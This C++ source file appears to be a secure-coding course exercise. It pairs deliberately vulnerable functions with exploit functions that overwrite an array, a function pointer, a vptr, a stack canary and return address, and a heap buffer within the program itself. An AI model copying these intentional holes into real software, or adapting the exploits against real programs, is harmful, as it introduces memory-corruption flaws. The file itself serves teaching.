#include <iostream>
#include <string>

using namespace std;

/*************************************
 * ARRAY VULNERABILTY
 * 1. There must be an array and an array index variable
 * 2. The array index variable must be reachable through external input.
 * 3. There must not be bounds checking on the array index variable.
 ****************************************/
int arrayVulnerability(int index, int score)
{
   // Array of assignment scores (each score is out of 100)
   int scores[5] = { 100, 100, 100, 100, 0 };

   // Weighting for each assignment
   // Note: this is the protected asset
   int weights[5] = { 10, 20, 30, 40, 50 };
   // cout << "Weights address: " << hex << &weights[0] << endl;
   // cout << "Scores address: " << hex << &scores[0] << endl;
   // cout << "Targeted address: " << hex << &scores[index] << endl;

   // Sanitize our input: no scores > 100 or < 0!
   if (score > 100) {
      score = 100;
   }
   if (score < 0) {
      score = 0;
   }

   scores[index] = score;

   // Do some quick math to get an overall score by multiplying
   // each score by its weight and averaging them.
   int weightedScores = 0;
   int totalWeights = 0;
   for (int i=0; i<5; i++) {
      weightedScores += scores[i] * weights[i];
      totalWeights += weights[i];
      // cout << "\t" << dec << scores[i] << " | " << weights[i] << endl;
   }

   return weightedScores / totalWeights;
   // cout << "Weighted score: " << dec << weightedScores / totalWeights << endl;
}

/**************************************
 * ARRAY WORKING
 * Call arrayVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void arrayWorking()
{
   // Give ourselves a full marks on the last (ungraded) assignment
   int totalScore = arrayVulnerability(4, 100);
   // Our weighted average should be 100
   cout << "Overall score (working, expecting 100):\t\t" << totalScore << endl;

   // Update our last assignment grade to 80
   totalScore = arrayVulnerability(4, 80);
   // This will lower our overall score to 93
   cout << "Overall score (working, expecting 93):\t\t" << totalScore << endl;
}

/**************************************
 * ARRAY EXPLOIT
 * 1. The attacker provides an array index value outside the expected range
 * 2. The attacker must be able to provide input or redirect
 *    existing input into the array at the index he provided
 * 3. The injected value must alter program state in a way
 *    that is desirable to the attacker
 *************************************/
void arrayExploit()
{
   int totalScore = arrayVulnerability(4, 80);
   cout << "Overall score (pre-exploit, expecting 93):\t" << totalScore << endl;

   // At this point, our total score will be 93. Let's bump it by
   // exploiting the array index to change the weight for the final
   // assignment. We use a negative index to write our 'score' into
   // the protected array of weights, changing our grade to 99.
   totalScore = arrayVulnerability(-4, 1);
   cout << "Overall score (post-exploit, expecting 93):\t" << totalScore << endl;
}

void arcSafeFunction() {
   cout << "Safe!" << endl;
}

void arcUnsafeFunction() {
   cout << "UNSAFE!!" << endl;
}

/*************************************
 * ARC VULNERABILTY
 * ...
 ****************************************/
void arcVulnerability(const char *input)
{
   // Setup our function pointer to arcSafeFunction()
   void (* pointerToSafe)() = arcSafeFunction;

   // Make a small buffer
   char buffer[4];

   // Note: using memcpy + strlen here is the vulnerability - it will
   // overrun the buffer.
   memcpy(buffer, input, strlen(input));

   // Execute our (hopefully) safe function
   pointerToSafe();
}

/**************************************
 * ARC WORKING
 * Call arcVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void arcWorking()
{
   arcVulnerability("Hi\0\0");
}

/**************************************
 * ARC EXPLOIT
 * ...
 *************************************/
void arcExploit()
{
   // Initialize our input with zeros, make it big enough to hold
   // the buffer size + function pointer.
   char maliciousInput[4 + sizeof(long *)] = { 0 };

   // Set our input to something strcpy won't mind (no null character)
   maliciousInput[0] = 0x42;
   maliciousInput[1] = 0x61;
   maliciousInput[2] = 0x64;
   maliciousInput[3] = 0x21;

   // Set the remainder of our input to the address of arcUnsafeFunction()
   void (* pointerToUnsafe)() = arcUnsafeFunction;
   memcpy(maliciousInput + 4, (long *)&pointerToUnsafe, sizeof(long *));

   arcVulnerability(maliciousInput);
}

// Simple classes to demonstrate vptr / vtable manipulation
class MyClass {
public:
   virtual void sayHi() {
      cout << "Hello!" << endl;
   }
private:
   char buffer[4] = "Hi\0";
};

class MyUnsafeClass: MyClass {
public:
   virtual void sayHi() {
      cout << "UNSAFE!!" << endl;
   }
};

void vtableSayHi(MyClass *myClass) {
   myClass->sayHi();
}

/*************************************
 * VTABLE VULNERABILTY
 * ...
 ****************************************/
void vtableVulnerability(const char *input)
{
   // Overall note: clang on macOS (x86_64) puts the vptr before any
   // class members (like buffer), so there's no way to reproduce the
   // vtable spraying attack as canonized in the reading - at least
   // on this class of machines using this compiler. It is, however,
   // possible to use a stack smashing attack to accomplish the same:
   // change the vptr of a class. This is what is implemented here.

   MyClass myClass = MyClass();
   char buffer[2];

   // Note: using memcpy + strlen here is the vulnerability - it will
   // overrun the buffer. Given the positions in the stack, it allows
   // the caller to potentially overwrite myClass' vptr.
   memcpy(buffer, input, strlen(input));

   // Note: this indirection is necessary because otherwise the vptr
   // (that may be overwritten) is cached.
   vtableSayHi(&myClass);
}

/**************************************
 * VTABLE WORKING
 * Call vtableVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void vtableWorking()
{
   vtableVulnerability("Hi");
}

/**************************************
 * VTABLE EXPLOIT
 * ...
 *************************************/
void vtableExploit()
{
   // Initialize our input with zeros, make it big enough to hold
   // the buffer size + function pointer.
   char maliciousInput[2 + sizeof(long *) + sizeof(long *)] = { 0 };

   // Set our input to something strcpy won't mind (no null character)
   maliciousInput[0] = 0x48;
   maliciousInput[1] = 0x69;

   // Set the remainder of our input to the address of MyUnsafeClass' VTable
   MyUnsafeClass myUnsafeClass = MyUnsafeClass();
   long **myUnsafeClassVTable = (long **)((long *)&myUnsafeClass)[0];
   memcpy(maliciousInput + 2, (long *)&myUnsafeClassVTable, sizeof(long *));
   memcpy(maliciousInput + 2 + sizeof(long *), (long *)&myUnsafeClassVTable, sizeof(long *));

   vtableVulnerability(maliciousInput);
}

/*************************************
 * STACK VULNERABILTY
 * ...
 ****************************************/
void stackVulnerability(const string &str)
{
   char buffer[8] = { 0 };

   // Note: using memcpy + strlen here is the vulnerability - it will
   // overrun the buffer.
   memcpy(buffer, str.c_str(), str.length());
}

/**************************************
 * STACK WORKING
 * Call stackVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void stackWorking()
{
   char msg[8] = "Hi!\0\0\0\0";
   stackVulnerability(msg);
}

static bool stackIsHealthy = false;

/**************************************
 * STACK EXPLOIT
 * ...
 *************************************/
void stackExploit()
{
   long anchor = 0;
   char exploit[32] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

   printf("Stack is");

   // Fetch our canary
   long canary = *((long *)(&anchor + 6));

   // Fetch our frame pointer
   long framePtr = *((long *)(&anchor - 11));

   // Fetch the return address
   long returnAddr = *((long *)(&anchor - 10)); // 2a35
   returnAddr += 145; // 2ac6
   // Note: The following will only work when run under
   // a debugger
   // long returnAddr = 0x100002acb;

   memcpy(exploit + 8, &canary, sizeof(long *));
   memcpy(exploit + 16, &framePtr, sizeof(long *));
   memcpy(exploit + 24, &returnAddr, sizeof(long *));

   string *exploitStr = new string(exploit, 32);
   stackVulnerability(*exploitStr);
   printf("NOT ");
   printf(" smashed!\n");
}

/*************************************
 * HEAP VULNERABILTY
 * ...
 ****************************************/
void heapVulnerability(const string &input)
{
   char *buff1 = (char *)malloc(4);
   char *buff2 = (char *)malloc(4);

   assert(buff1 < buff2);
   memcpy(buff1, input.c_str(), input.length());

   free(buff2);
   free(buff1);

   char *buff3 = (char *)malloc(12);
   strncpy(buff3, "Heap safe!\n", 11);
   printf("%s\n", buff3);
}

/**************************************
 * HEAP WORKING
 * Call heapVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void heapWorking()
{
   heapVulnerability("Working");
}

/**************************************
 * HEAP EXPLOIT
 * ...
 *************************************/
void heapExploit()
{
   char exploit[32] = "aaaaaaaaaaaNOT!";
   string *exploitStr = new string(exploit, 32);
   heapVulnerability(*exploitStr);
}

/*************************************
 * INTEGER OVERFLOW VULNERABILTY
 * ...
 ****************************************/
void intOverflowVulnerability(int octalPerms)
{
   // This is a subtle one. We're incorrectly comparing an int
   // with the least significant 3 binary digits. We're expecting
   // an POSIX file permissions octal-style pattern (i.e. 0755)
   // but going about the check all wrong.
   // For reference: POSIX permissions should be checked
   // bit-by-bit in binary.
   if (octalPerms >= 07) {
      cout << "Access granted" << endl;
      return;
   }

   cout << "Access denied!" << endl;
}

/**************************************
 * INTEGER OVERFLOW WORKING
 * Call intOverflowVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void intOverflowWorking()
{
   intOverflowVulnerability(01);
}

/**************************************
 * INTEGER OVERFLOW EXPLOIT
 * ...
 *************************************/
void intOverflowExploit()
{
   intOverflowVulnerability(100);
}

/*************************************
 * ANSII-UNICODE VULNERABILTY
 * ...
 ****************************************/
void ansiiToUnicodeVulnerability(short *input)
{
   short buff[32];
   memcpy(buff, input, sizeof(buff) * sizeof(short));
   cout << buff << endl;
}

/**************************************
 * ANSII-UNICODE WORKING
 * Call ansiiToUnicodeVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void ansiiToUnicodeWorking()
{
   short msg[5] = { 0x53, 0x61, 0x66, 0x65, 0x21 };
   ansiiToUnicodeVulnerability(msg);
}

/**************************************
 * ANSII-UNICODE EXPLOIT
 * ...
 *************************************/
void ansiiToUnicodeExploit()
{
   // Note: Running this with ASAN enabled will show the buffer
   // overflow. Running it as-is will abort.
   short msg[64] = {};
   ansiiToUnicodeVulnerability(msg);
}

static const char *SectionBoundary = "********************\n";

/**********************************************
 * MAIN : The main function.
 **********************************************/
int main()
{
   cout << "Array Index" << endl;
   cout << SectionBoundary << endl;

   arrayWorking();
   arrayExploit();

   cout << endl << "ARC" << endl;
   cout << SectionBoundary << endl;

   arcWorking();
   arcExploit();

   cout << endl << "VTABLE" << endl;
   cout << SectionBoundary << endl;

   vtableWorking();
   vtableExploit();

   cout << endl << "Stack Smashing" << endl;
   cout << SectionBoundary << endl;

   stackWorking();
   stackExploit();

   cout << endl << "Heap Spraying" << endl;
   cout << SectionBoundary << endl;

   heapWorking();
   heapExploit();

   cout << endl << "Integer Overflow" << endl;
   cout << SectionBoundary << endl;

   intOverflowWorking();
   intOverflowExploit();

   cout << endl << "ASCII to Unicode" << endl;
   cout << SectionBoundary << endl;

   ansiiToUnicodeWorking();
   ansiiToUnicodeExploit();

   return 0;
}
